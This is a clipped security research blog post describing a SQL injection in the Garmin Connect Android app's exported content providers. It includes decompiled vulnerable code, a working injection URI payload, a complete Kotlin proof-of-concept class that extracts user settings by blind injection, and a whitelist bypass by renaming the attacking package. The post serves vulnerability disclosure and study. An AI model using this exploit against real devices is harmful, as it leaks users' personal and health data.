---
title: Injection for an athlete
source: https://swarm.ptsecurity.com/injection-for-an-athlete/
author:
  - PT SWARM
published:
created: 2026-02-01
description: After yet another workout where my sports watch completely lost GPS, I’d had enough. I decided to dig into its firmware and pinpoint the problem. I couldn’t find it published anywhere. No download section, no public archive, nothing. So, I changed tactics and went in through the Android app instead, hoping I could pull the […]
tags:
  - clippings/articles
  - Android
---
# Injection for an athlete

![](https://swarm.ptsecurity.com/wp-content/uploads/2025/11/e8c7ed9c-kdpv.png)

> [!summary]+
> > The article details a SQL injection vulnerability discovered in the Garmin Connect Mobile Android application.
> The researcher initially found two content providers, `SSOProvider` and `DevicesProvider`, exposed due to incorrect security assumptions (incorrect `android:protectionLevel`).
> The `SSOProvider` exposed user details like `serverEnvironment`, `userProfileID`, and `userName`, but not enough for a full account takeover.
> The `DevicesProvider` was found to be vulnerable to SQL injection. It unsafely constructed SQL queries using `StringBuilder` from user-supplied device identifiers (product numbers) without proper sanitization.
> This SQL injection allowed an attacker to extract sensitive data, including what could be considered medical information, from various tables within the app's internal database (e.g., the `json` table's `USER_SETTINGS`).
> The exploitation involved a boolean-based blind SQL injection, requiring careful payload construction to avoid commas and using `LIKE $payload || char(37) ESCAPE '\\'` to extract data character by character.
> The vulnerability persisted in a newer app version (5.14) despite an attempted fix. Garmin removed the `android:protectionLevel` flag and introduced a package name whitelist for provider access.
> However, this whitelist was bypassable by simply renaming the attacker's app package to one of the whitelisted (including debug) package names, confirming the core vulnerability remained.
> The article concludes with a responsible disclosure timeline with Garmin, leading to the eventual publication of the research.

I changed tactics and went in through the Android app instead

That’s where this story really begins.

I started by looking at the app’s [AndroidManifest.xml](../Dev,%20ICT%20&%20Cybersec/Mobile%20Hacking/AndroidManifest.xml.md).

```xml
<provider
    android:name="com.garmin.android.apps.connectmobile.contentprovider.DevicesProvider"
    android:protectionLevel="signature"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.garmin.android.apps.connectmobile.contentprovider.devices"/>
<provider
    android:name="com.garmin.android.apps.connectmobile.contentprovider.SSOProvider"
    android:protectionLevel="signature"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.garmin.android.apps.connectmobile.contentprovider.sso"/>
```

I noticed two exported [Content Providers](../Dev,%20ICT%20&%20Cybersec/Mobile%20Hacking/Content%20Providers.md) with a curious flag `android:protectionLevel="signature"`. Why is that interesting? Because according to the [official documentation](https://developer.android.com/guide/topics/manifest/provider-element), providers **do not** have such a flag.

That suggests the developer was working with incorrect security assumptions about these components and had effectively exposed them to any caller instead of limiting access to applications inside the same ecosystem.

## SSOProvider

```java
public class SSOProvider extends ContentProvider {  
    public static Bundle m8137a() {  
        ...
        Bundle bundle = new Bundle(5);  
        bundle.putString("serverEnvironment", GCMSettingManager.m9390s().f125010a.name());  
        bundle.putLong("userProfileID", userProfilePk);  
        bundle.putString("connectUserToken", mo29850g.f250a);  
        bundle.putString("connectUserSecret", str);  
        bundle.putString("userName", GCMSettingManager.m9349D());  
        return bundle;  
    }
    ...
    @Override
    public final Bundle call(String str, String str2, Bundle bundle) {  
        if (TextUtils.isEmpty(str)) {  
            return null;  
        }  
        if (!"getSignedInUserInfo".equals(str)) {  
            h2.m8516g("SSOProvider", "Fix me developer, I am not handling methodToCall " + str);  
            return null;  
        }  
        try {  
            return m8137a();  
        } catch (ExceptionInInitializerError e12) {  
            h2.C5191a.m8520d("SSOProvider", "Exception in SSOProvider calling getSignedInUserInfo(): " + e12.getMessage());  
            return null;  
        }  
    }
}
```

From the decompiled provider code, it was clear that retrieving user data requires calling the `getSignedInUserInfo` method. There are no additional restrictions. Any application can request this data.

The extracted data is not enough to get the user’s authorization token. In addition to the `userToken/userSecret` pair, you also need a second pair, `consumerToken/consumerSecret`. Those can only be obtained by registering for Garmin’s developer program.

## DevicesProvider

With this provider, things got a lot more interesting. It lets you retrieve information about the user’s connected devices.

```java
public class DevicesProvider extends ContentProvider implements BaseColumns {  

    public static final UriMatcher f23097a;  

    static {  
        UriMatcher uriMatcher = new UriMatcher(-1);  
        f23097a = uriMatcher;  
        uriMatcher.addURI("com.garmin.android.apps.connectmobile.contentprovider.devices", "devices/product_nbrs/*", 1);  
        uriMatcher.addURI("com.garmin.android.apps.connectmobile.contentprovider.devices", "devices", 2);  
        uriMatcher.addURI("com.garmin.android.apps.connectmobile.contentprovider.devices.sdk", "devices/product_nbrs/*", 3);  
    }  

    public static C37963a m10126a(ArrayList arrayList, boolean z7) {  
        ...
        arrayList2.add(new C37964b(interfaceC3736e.mo7425r2(), strMo7391L, 

        interfaceC3736e.getPartNumber(), 
        interfaceC3736e.getProductNumber(), 
        interfaceC3736e.getSoftwareVersion(), 
        C3008b.m6553g(interfaceC3736e), 
        interfaceC3736e.getDisplayName(), 

        interfaceC3736e.mo7410d(), c3735d.f15835c, i12, z7 ? interfaceC3736e.mo7412d3() : null, z7 ? interfaceC3736e.mo7382E2() : null, z7 ? interfaceC3736e.mo7426s() : null, interfaceC3736e.mo7409c()));  
            }  
        }  
        return new C37963a(arrayList2);  
    }

    @Override // android.content.ContentProvider  
    public final Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) throws Throwable {  
        int iMatch = f23097a.match(uri);  
        ... 
        if (iMatch == 1) {  // /devices/product_nbrs/*
            z7 = true;  
        } else {  
            if (iMatch == 2) {  // /devices
                return m10126a(C2471p.m5655z(), true);  
            }  
            if (iMatch != 3) {  
                return null;  
            }  
            z7 = false;  
        }
        ...
        String[] strArrSplit = uri.getLastPathSegment().split(",");  

        StringBuilder sb2 = new StringBuilder("product_nbr");  
        if (strArrSplit.length == 1) {  
            sb2.append("='");  
            sb2.append(strArrSplit[0]);  
            sb2.append("'");  
        } else {  
            sb2.append(" IN(");  
            while (i12 < strArrSplit.length) {  
                sb2.append("'");  
                sb2.append(strArrSplit[i12]);  
                sb2.append("'");  
                i12++;  
                if (i12 < strArrSplit.length) {  
                    sb2.append(",");  
                }  
            }  
            sb2.append(")");  
        }  
        ...
        cursorQuery = AbstractC19805f.m30561s().query("devices", null, sb2.toString(), null, null, null, "is_connected desc, last_connected_timestamp desc");  

        return m10126a(C1046i9.m2940s(arrayList3), z7);  
    }
    ...
}
```

The provider checks the supplied URI against a predefined pattern and, if it matches, calls the `query` method. That method then decides whether the request is for all data at once or for a specific identifier.

This input ends up shaping the final SQL query that goes to the database.

If you look closely at how that query is built, the problem becomes obvious. The query is assembled with `StringBuilder` and there is no sanitization, which means an [SQL Injection](../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/SQL%20Injection.md) is possible.

In general, SQL injections in providers are not rare. They are [found](https://blog.ostorlab.co/android-sql-contentProvider-sql-injections.html) even in system providers, and Google does not plan to fix them. Why is that? The answer is simple. In most cases the provider is backed by a database with a single table (plus service tables), or the remaining tables are just supporting tables that no one cares about. Consequently, if you can pull data from the provider and that data is useful, that alone is enough to confirm the vulnerability.

The injection turned out to be genuinely useful, because the database behind the provider included several valuable tables.

For example, the `json` table holds detailed information about user parameters, including data that could be considered medical.

## Exploitation of a vulnerability

To reach a URI that is vulnerable to injection, you first need the device identifier.

You can simply run a basic request to list all devices.

Using this query, you extract the first useful piece of information, which is the product number.

With the device number in hand, you can send a request to the URI `content://com.garmin.android.apps.connectmobile.contentprovider.devices/devices/product_nbrs/2158`, which should return the same information

the following query will be executed against the database:

```sql
SELECT * FROM devices WHERE product_nbr='2158' ORDER BY is_connected desc, last_connected_timestamp desc
```

The story could have ended here with a standard union-based injection, if not for the way this provider processes data from the database cursor. As far as I can tell, it uses a wrapper that pulls out only certain fields of certain types from the response and returns only that set.

That was not the only problem I ran into while exploiting this vulnerability. There was one critical requirement: the query had to avoid commas entirely. This restriction is enforced by the following code from the provider:

```java
String[] strArrSplit = uri.getLastPathSegment().split(",");  

StringBuilder sb2 = new StringBuilder("product_nbr");  
if (strArrSplit.length == 1) {  
    sb2.append("='");  
    sb2.append(strArrSplit[0]);  
    sb2.append("'");  
} else {  
    sb2.append(" IN(");  
    while (i12 < strArrSplit.length) {  
        sb2.append("'");  
        sb2.append(strArrSplit[i12]);  
        sb2.append("'");  
        i12++;  
        if (i12 < strArrSplit.length) {  
            sb2.append(",");  
        }  
    }  
    sb2.append(")");  
}
```

This logic allows the provider to handle URIs like `content://com.garmin.android.apps.connectmobile.contentprovider.devices/devices/product_nbrs/2158,2159`. The provider then turns that into a query that uses the `IN` operator:

```sql
SELECT * FROM devices WHERE product_nbr IN('2158','2159') ORDER BY is_connected desc, last_connected_timestamp desc
```

Do we even need to say that this adds unnecessary chaos and turns the payload into an escaping nightmare? This limitation also affected how data could be extracted, and it narrowed the list of workable techniques. In the end, the base payload used to communicate with the provider looks like this:

```xml
content://com.garmin.android.apps.connectmobile.contentprovider.devices/devices/product_nbrs/2158' AND (SELECT cached_val LIKE $payload || char(37) ESCAPE '\\' FROM json WHERE concept_name='USER_SETTINGS')--
```

The idea behind this payload is to extract data character by character from the record with the key `USER_SETTINGS` in the `json` table. When you access the provider this way, it triggers a query roughly like the one shown above.

```sql
SELECT * FROM devices WHERE product_nbr='2158' AND (SELECT cached_val LIKE '_' || char(58) || char(37) ESCAPE '\' FROM json WHERE concept_name='USER_SETTINGS')
```

Putting it all together, we end up with the following class for performing a blind SQL injection against the provider `com.garmin.android.apps.connectmobile.contentprovider.DevicesProvider`:

```kotlin
package com.ptsecurity.garminsqlipoc

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext

class Exfiltrator(private val context: Context) {
    @SuppressLint("Range")
    fun startAttack(): Flow<String> = flow {
        val data = mutableListOf<String>()
        var sequenceIdx = 0
        var productNbr = ""
        var payload: String
        var uri: Uri
        var nextChar: Char

        // Query to extract existing product number
        context.contentResolver.query(
            Uri.parse("content://com.garmin.android.apps.connectmobile.contentprovider.devices/devices"),
            null,
            null,
            null,
            null
        )?.let { cursor ->
            if (cursor.count == 0) {
                return@flow
            }
            cursor.moveToFirst()
            productNbr = cursor.getString(cursor.getColumnIndex("product_nbr"))
        }

        // Series of queries to exfiltrate all user settings
        for (i in 0..1544) {
            if (i % 200 == 0) {
                Log.d(TAG, "Partially extracted data: ${data.joinToString(separator = "")}")
                emit(data.joinToString(separator = ""))
            }

            while (sequenceIdx < OPTIMIZED_SEQUENCE.length) {
                nextChar = OPTIMIZED_SEQUENCE[sequenceIdx]
                payload = "'${"_".repeat(i)}'||${if (nextChar == '_') "'\\'||" else ""}char(${nextChar.code})"

                uri =
                    Uri.parse("content://com.garmin.android.apps.connectmobile.contentprovider.devices/devices/product_nbrs/$productNbr' AND (SELECT cached_val LIKE $payload || char(37) ESCAPE '\\' FROM json WHERE concept_name='USER_SETTINGS')--")

                if (query(uri)) {
                    data.add(nextChar.toString())
                    sequenceIdx = 0
                    break
                }
                sequenceIdx++
            }
        }
        Log.d(TAG, "Exfiltrated data:\n${data.joinToString(separator = "")}")
        emit(data.joinToString(separator = ""))
    }

    private suspend fun query(uri: Uri): Boolean {
        return withContext(Dispatchers.IO) {
            var cursor: Cursor? = null
            try {
                cursor = context.contentResolver.query(uri, null, null, null, null)

                if (cursor != null) {
                    return@withContext cursor.count > 0
                } else {
                    return@withContext false
                }
            } catch (e: SecurityException) {
                Log.e(TAG, "Permission denied accessing ContentProvider", e)
            } catch (e: IllegalArgumentException) {
                Log.e(TAG, "Invalid URI or ContentProvider not found", e)
            } catch (e: Exception) {
                Log.e(TAG, "Error querying ContentProvider", e)
            } finally {
                cursor?.close()
            }

            false
        }
    }

    companion object {
        private const val TAG = "Exfiltrator"

        private const val OPTIMIZED_SEQUENCE = " {\":,._-}[]0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    }
}
```

## But that wasn’t the end of the story.

I realized the version of the application I had analyzed wasn’t current.

I dropped the new binary into a decompiler and started looking at what had changed.

First, they removed the unnecessary `android:protectionLevel` flag from the provider. However, the providers were still exported, which meant exploitation might still be possible — or new issues might appear. Second, both vulnerable providers now included a check that compared the calling application’s package name against a whitelist.

```java
public static boolean m18185a(String str) {  
    C21868k.m28483j().getClass();  
    JSONArray jSONArray = new JSONArray(C9048i.f39804c.m11180a().f39823b.mo11170h("content_provider_consuming_apps_whitelist"));  
    int length = jSONArray.length();  
    for (int i10 = 0; i10 < length; i10++) {  
        if (C36065r.m52958g(str, jSONArray.getString(i10))) {  
            return true;  
        }  
    }  
    return false;  
}
...   
String callingPackage = getCallingPackage();  
c15128a.getClass();  
if (C15128a.m18185a(callingPackage) && !TextUtils.isEmpty(str)) {
    // Do dangerous things
}
```

There were no additional checks. In practice, bypassing this validation only required renaming the exploit package to any identifier in the whitelist. At the time of analysis, it looked like this:

```xml
["com.garmin.android.apps.connectmobile","com.garmin.android.apps.dive","com.garmin.android.apps.explore","com.garmin.android.apps.explore.develop","com.garmin.android.apps.golf","com.garmin.android.apps.messenger","com.garmin.android.apps.virb","com.garmin.android.apps.vivokid","com.garmin.android.driveapp.dezl","com.garmin.android.marine","com.garmin.connectiq","tacx.android","com.garmin.android.apps.gccm","com.garmin.android.apps.shotview","com.garmin.android.apps.shotview.debug","com.garmin.android.apps.shotview.release"]
```